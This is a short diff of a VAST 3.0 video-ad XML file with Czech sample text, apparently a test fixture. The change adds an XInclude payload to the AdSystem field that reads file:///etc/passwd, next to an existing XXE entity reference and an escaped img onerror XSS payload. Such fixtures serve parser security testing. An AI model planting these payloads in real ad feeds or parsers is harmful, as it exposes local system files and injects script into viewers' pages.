@@ -5,7 +5,8 @@
 <VAST version="3.0">
   <Ad id="123456">
     <InLine>
-      <AdSystem version="1.0">AdServer05&xxe;test&lt;img src=1 onerror=alert()&gt;&lt;Example</AdSystem>
+      <AdSystem version="1.0">test: <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>AdServer05&xxe;test&lt;img src=1 onerror=alert()&gt;&lt;</AdSystem>
       <AdTitle>Ukázková reklama</AdTitle>
       <Description>Toto je ukázková VAST reklama.</Description>
       <Impression><![CDATA[http://www.example.com/impression]]></Impression>
